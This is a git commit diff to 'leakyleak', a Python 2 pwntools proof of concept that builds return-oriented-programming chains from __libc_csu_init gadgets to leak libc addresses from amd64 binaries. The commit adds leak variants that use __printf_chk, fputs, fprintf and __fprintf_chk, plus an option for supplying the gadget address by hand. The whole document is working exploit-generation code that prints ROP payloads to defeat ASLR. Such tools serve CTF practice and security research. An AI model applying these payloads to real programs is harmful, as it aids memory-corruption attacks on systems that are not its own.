876749a8a28c3c361ff595da1269c35b4d51f480
Andrea Fioraldi <andreafioraldi@gmail.com>
2018-03-27 13:06:40 +0200

    added more functions to print the leak

--- README.md
+++ README.md
@@ -3,8 +3,8 @@ a POC for the libc address leak using __libc_csu_init from the paper https://www
 
 ## Usage
 ```
-python leakyleak.py <binary> [address_of_pointer_to_leak]
+python leakyleak.py <binary> [address_of_pointer_to_leak] [address_of_libc_csu_init]
 ```
 By default without specifying `address_of_pointer_to_leak` the tool will leak the address of the function used to print the leak (puts, printf or write).
 
-
+If the binary doesn't export the symbol __libc_csu_init you must specify the parameter `address_of_libc_csu_init`.
--- leakyleak.py
+++ leakyleak.py
@@ -2,7 +2,7 @@ from pwn import *
 import sys
 
 if len(sys.argv) < 2:
-    print "usage: python leakyleak.py <binary> [address_of_pointer_to_leak]"
+    print "usage: python leakyleak.py <binary> [address_of_pointer_to_leak] [address_of_libc_csu_init]"
     exit(1)
 
 to_leak = None
@@ -19,19 +19,26 @@ if binary.arch != "amd64":
     print "error: the binary arch must be amd64"
     exit(1)
 
-try:
-    gadget1 = binary.symbols["__libc_csu_init"] + (0x4005EA - 0x400590)
-    gadget2 = binary.symbols["__libc_csu_init"] + (0x4005D0 - 0x400590)
-except KeyError:
-    print "error: __libc_csu_init is not in the symbols list"
-    exit(1)
+if len(sys.argv) > 3:
+    try:
+        csu_init_addr = int(sys.argv[3], 16)
+    except:
+        print "error: the address of __libc_csu_init must be an exadecimal number"
+        exit(1)
+    gadget1 = csu_init_addr + (0x4005EA - 0x400590)
+    gadget2 = csu_init_addr + (0x4005D0 - 0x400590)
+else:
+    try:
+        gadget1 = binary.symbols["__libc_csu_init"] + (0x4005EA - 0x400590)
+        gadget2 = binary.symbols["__libc_csu_init"] + (0x4005D0 - 0x400590)
+    except KeyError:
+        print "error: __libc_csu_init is not in the symbols list, specify address_of_libc_csu_init in program args"
+        exit(1)
 
 if "puts" in binary.got:
     print "[*] using `puts` to print the leak"
     print
-    #r12 = puts@plt
-    #rbx = 0
-    #r15d = puts@got
+    # puts(&puts)
     print "rop = ''"
     print "rop += p64(0x%x) # gadget 1" % gadget1
     print "rop += p64(0) # rbx"
@@ -54,9 +61,7 @@ if "puts" in binary.got:
 elif "printf" in binary.got:
     print "[*] using `printf` to print the leak"
     print
-    #r12 = printf@plt
-    #rbx = 0
-    #r15d = printf@got
+    # printf(&printf)
     print "rop = ''"
     print "rop += p64(0x%x) # gadget 1" % gadget1
     print "rop += p64(0) # rbx"
@@ -79,11 +84,7 @@ elif "printf" in binary.got:
 elif "write" in binary.got:
     print "[*] using `write` to print the leak"
     print
-    #r12 = write@plt
-    #rbx = 0
-    #r15d = 1
-    #r14 = write@got
-    #r13 = 8
+    # write(1, &write, sizeof(void*))
     print "rop = ''"
     print "rop += p64(0x%x) # gadget 1" % gadget1
     print "rop += p64(0) # rbx"
@@ -103,5 +104,108 @@ elif "write" in binary.got:
     print "rop += p64(0) # r13"
     print "rop += p64(0) # r14"
     print "rop += p64(0) # r15"
+elif "__printf_chk" in binary.got:
+    print "[*] using `___printf_chk` to print the leak"
+    print
+    # __printf_chk(0, &__printf_chk)
+    print "rop = ''"
+    print "rop += p64(0x%x) # gadget 1" % gadget1
+    print "rop += p64(0) # rbx"
+    print "rop += p64(0) # rbp"
+    print "rop += p64(0x%x) # r12 [__printf_chk@got]" % binary.got["__printf_chk"]
+    print "rop += p64(0) # r13"
+    if to_leak == None:
+        print "rop += p64(0x%x) # r14 [__printf_chk@got]" % binary.got["__printf_chk"]
+    else:
+        print "rop += p64(0x%x) # r14 [address to leak]" % to_leak
+    print "rop += p64(0) # r15"
+    print "rop += p64(0x%x) # gadget 2" % gadget2
+    print "rop += p64(0xdeadbeef) # junk"
+    print "rop += p64(0) # rbx"
+    print "rop += p64(0) # rbp"
+    print "rop += p64(0) # r12"
+    print "rop += p64(0) # r13"
+    print "rop += p64(0) # r14"
+    print "rop += p64(0) # r15"
+elif "stdout" in binary.symbols:
+    if "fputs" in binary.got:
+        print "[*] using `fputs` to print the leak"
+        print
+        # fputs(stdout, &fputs)
+        print "rop = ''"
+        print "rop += p64(0x%x) # gadget 1" % gadget1
+        print "rop += p64(0) # rbx"
+        print "rop += p64(0) # rbp"
+        print "rop += p64(0x%x) # r12 [fputs@got]" % binary.got["fputs"]
+        print "rop += p64(0) # r13"
+        print "rop += p64(0x%x) # r14 [stdout]" % binary.symbols["stdout"]
+        if to_leak == None:
+            print "rop += p64(0x%x) # r15 [fputs@got]" % binary.got["fputs"]
+        else:
+            print "rop += p64(0x%x) # r15 [address to leak]" % to_leak
+        print "rop += p64(0x%x) # gadget 2" % gadget2
+        print "rop += p64(0xdeadbeef) # junk"
+        print "rop += p64(0) # rbx"
+        print "rop += p64(0) # rbp"
+        print "rop += p64(0) # r12"
+        print "rop += p64(0) # r13"
+        print "rop += p64(0) # r14"
+        print "rop += p64(0) # r15"
+    elif "fprintf" in binary.got:
+        print "[*] using `fprintf` to print the leak"
+        print
+        # fprintf(stdout, &fprintf)
+        print "rop = ''"
+        print "rop += p64(0x%x) # gadget 1" % gadget1
+        print "rop += p64(0) # rbx"
+        print "rop += p64(0) # rbp"
+        print "rop += p64(0x%x) # r12 [fprintf@got]" % binary.got["fprintf"]
+        print "rop += p64(0) # r13"
+        if to_leak == None:
+            print "rop += p64(0x%x) # r14 [fprintf@got]" % binary.got["fprintf"]
+        else:
+            print "rop += p64(0x%x) # r14 [address to leak]" % to_leak
+        print "rop += p64(0x%x) # r15 [stdout]" % binary.symbols["stdout"]
+        print "rop += p64(0x%x) # gadget 2" % gadget2
+        print "rop += p64(0xdeadbeef) # junk"
+        print "rop += p64(0) # rbx"
+        print "rop += p64(0) # rbp"
+        print "rop += p64(0) # r12"
+        print "rop += p64(0) # r13"
+        print "rop += p64(0) # r14"
+        print "rop += p64(0) # r15"
+    elif "__fprintf_chk" in binary.got:
+        print "[*] using `__fprintf_chk` to print the leak"
+        print
+        # __fprintf_chk(stdout, 0, &__fprintf_chk)
+        print "rop = ''"
+        print "rop += p64(0x%x) # gadget 1" % gadget1
+        print "rop += p64(0) # rbx"
+        print "rop += p64(0) # rbp"
+        print "rop += p64(0x%x) # r12 [__fprintf_chk@got]" % binary.got["__fprintf_chk"]
+        if to_leak == None:
+            print "rop += p64(0x%x) # r13 [__fprintf_chk@got]" % binary.got["__fprintf_chk"]
+        else:
+            print "rop += p64(0x%x) # r13 [address to leak]" % to_leak
+        print "rop += p64(0) # r14"
+        print "rop += p64(0x%x) # r15 [stdout]" % binary.symbols["stdout"]
+        print "rop += p64(0x%x) # gadget 2" % gadget2
+        print "rop += p64(0xdeadbeef) # junk"
+        print "rop += p64(0) # rbx"
+        print "rop += p64(0) # rbp"
+        print "rop += p64(0) # r12"
+        print "rop += p64(0) # r13"
+        print "rop += p64(0) # r14"
+        print "rop += p64(0) # r15"
+
+
+
+
+
+
+
+
+
+
 
 
